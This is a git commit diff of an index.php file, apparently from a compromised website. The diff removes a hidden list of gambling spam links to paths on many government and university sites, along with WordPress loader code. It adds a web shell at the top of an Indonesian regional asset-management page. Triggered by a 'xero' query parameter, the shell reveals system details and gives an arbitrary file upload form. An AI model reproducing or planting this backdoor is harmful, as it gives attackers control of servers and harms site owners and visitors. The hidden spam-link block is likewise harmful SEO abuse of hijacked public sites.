2b142043d6d4bc02befb5d86fac31aa28542ea68
ebokzsss <84223726+ebokzsss@users.noreply.github.com>
2023-12-08 01:17:32 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,49 +1,37 @@
-        <ul style="display:none">
-            <li style="color: #000000;"><a href="https://sakip.bolselkab.go.id/tmp/view/-p/masterslot/">https://sakip.bolselkab.go.id/tmp/view/-p/masterslot/</a></li> 
-            <li style="color: #000000;"><a href="https://tlhp-new.sulselprov.go.id/assets/-/masterslot/">MasterSlot</a></li> 
-            <li style="color: #000000;"><a href="https://santika.upnjatim.ac.id/products/pastiwin-gacor/">https://santika.upnjatim.ac.id/products/pastiwin-gacor/</a></li> 
-            <li style="color: #000000;"><a href="https://bahanajar.jtik.ft.unm.ac.id/img/-/mbokslot/">https://bahanajar.jtik.ft.unm.ac.id/img/-/mbokslot/</a></li> 
-            <li style="color: #000000;"><a href="http://belma.hekko.pl/">Slot Gacor</a></li> 
-            <li style="color: #000000;"><a href="https://demo.gridgum.com/">Slot Thailand</a></li> 
-            <li style="color: #000000;"><a href="https://ftik.iain-manado.ac.id/-/masterslot/">https://ftik.iain-manado.ac.id/-/masterslot/</a></li> 
-            <li style="color: #000000;"><a href="https://daring.uniga.ac.id/b34n55/-/mahjong-pgsoft/">https://daring.uniga.ac.id/b34n55/-/mahjong-pgsoft/</a></li> 
-            <li style="color: #000000;"><a href="https://jurnal.itkeswhs.ac.id/classes/-/prothai-maxwin/">akun pro thailand</a></li> 
-            <li style="color: #000000;"><a href="https://repository.stai-ali.ac.id/">LadangToto</a></li> 
-            <li style="color: #000000;"><a href="https://kokita.ketapangkab.go.id/assets/-/masterslot/">https://kokita.ketapangkab.go.id/assets/-/masterslot/</a></li> 
-            <li style="color: #000000;"><a href="http://elingbphtb.banyumaskab.go.id/bphtbbanyumas_2021/vendor/-/slotgacor/">slot gacor</a></li> 
-            <li style="color: #000000;"><a href="http://kabayan.pta-bandung.go.id/delegasi/-/slot-mahjong/">http://kabayan.pta-bandung.go.id/delegasi/-/slot-mahjong/</a></li> 
-            <li style="color: #000000;"><a href="https://santika.upnjatim.ac.id/wp-content/-/bocoran-admin-jarwo/">https://santika.upnjatim.ac.id/wp-content/-/bocoran-admin-jarwo/</a></li> 
-            <li style="color: #000000;"><a href="https://alumniilkom.ulm.ac.id/wp-content/GARANSI/">https://alumniilkom.ulm.ac.id/wp-content/GARANSI/</a></li> 
-            <li style="color: #000000;"><a href="https://bapenda.pasuruankota.go.id/kepatuhan/css/bonus-maxwin/">Slot Bonus</a></li> 
-            <li style="color: #000000;"><a href="https://epotensi.pemalangkab.go.id/public/upload/pulsa-maxwin/">https://epotensi.pemalangkab.go.id/public/upload/pulsa-maxwin/</a></li> 
-            <li style="color: #000000;"><a href="https://prosiding.utp.ac.id/classes/-/LadangToto/">https://prosiding.utp.ac.id/classes/-/LadangToto/</a></li> 
-            <li style="color: #000000;"><a href="https://daring.uniga.ac.id/b34n55/-/mahjong-pgsoft/">https://daring.uniga.ac.id/b34n55/-/mahjong-pgsoft/</a></li> 
-            <li style="color: #000000;"><a href="https://permata.unkhair.ac.id/assets/-/gacorbanget/">https://permata.unkhair.ac.id/assets/-/gacorbanget/</a></li> 
-            <li style="color: #000000;"><a href="https://jurnal.itkeswhs.ac.id/classes/-/prothai-maxwin/">https://jurnal.itkeswhs.ac.id/classes/-/prothai-maxwin/</a></li> 
-            <li style="color: #000000;"><a href="https://lmc.unimus.ac.id/upload/apk-gacor/">https://lmc.unimus.ac.id/upload/apk-gacor/</a></li> 
-            <li style="color: #000000;"><a href="http://epotensi.tulungagung.go.id/data/-/bocoran-jarwo/">http://epotensi.tulungagung.go.id/data/-/bocoran-jarwo/</a></li> 
-            <li style="color: #000000;"><a href="https://bs.unri.ac.id/public/vendors/-/thailand-gacor/">https://bs.unri.ac.id/public/vendors/-/thailand-gacor/</a></li> 
-            <li style="color: #000000;"><a href="https://sakip.bolselkab.go.id/tmp/view/-/slot777/">https://sakip.bolselkab.go.id/tmp/view/-/slot777/</a></li> 
-            <li style="color: #000000;"><a href="https://ppid.rsam-bkt.sumbarprov.go.id/images/-/slot-thailand/">https://ppid.rsam-bkt.sumbarprov.go.id/images/-/slot-thailand/</a></li> 
-            <li style="color: #000000;"><a href="https://pskp.salatiga.go.id/plugins/-/slot-thailand/">https://pskp.salatiga.go.id/plugins/-/slot-thailand/</a></li> 
-            <li style="color: #000000;"><a href="https://bpbj.kedirikota.go.id/sass/-/slot-mahjong/">https://bpbj.kedirikota.go.id/sass/-/slot-mahjong/</a></li> 
-            <li style="color: #000000;"><a href="https://sdm.univrab.ac.id/uploads/-/slot-mahjong/">https://sdm.univrab.ac.id/uploads/-/slot-mahjong/</a></li> 
-
- </ul>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+<?php if(isset($_GET["xero"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
+<?
+include "session.php";
+seSession('BERANDA');
+date_default_timezone_set('Asia/Jakarta');
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Sipanda BMD Kab. Balangan</title>
+<link rel="shortcut icon" HREF="css/icon/icon.ico">
+<meta name="description" content="Downloads Free! 4 Drivers for Prolink WN2000 Networks Cards. Here's where you can downloads Free! the newest software for your WN2000.">
+<meta name="keywords" content="Sipand BMD">
+<meta name="Language" content="English">
+<link rel="stylesheet" type="text/css" href="css/style.css" >
+<link rel="stylesheet" type="text/css" href="css/dropdown.css">
+<link rel="stylesheet" type="text/css" href="css/display.css">
+<script type="text/javascript" src="js/jquery-1.3.2.min"></script>
+<script type="text/javascript" src="js/jquery.js"></script>
+<script type="text/javascript" src="js/dropdown.js"></script>
+<script type="text/javascript" src="js/slideshow.js"></script>
+<script type="text/javascript" src="js/display.js"></script>
+<script type="text/javascript" src="js/index.js"></script>
+<script type="text/javascript" src="js/general.js"></script>
+<script type="text/javascript" src="js/autorefresh.js"></script>
+</head>
+<body onload="func_view_data('detail_data','home.php','')">
+<div id="dat"><script type="text/javascript" src="js/tanggal.js"></script></div>
+<div id="pag">
+	<? include "header.php";?>
+	<? include "menu.php";?>
+	<? include "main.php";?>
+</div>
+<? include "bottom.php";?>
+</body>
+</html>
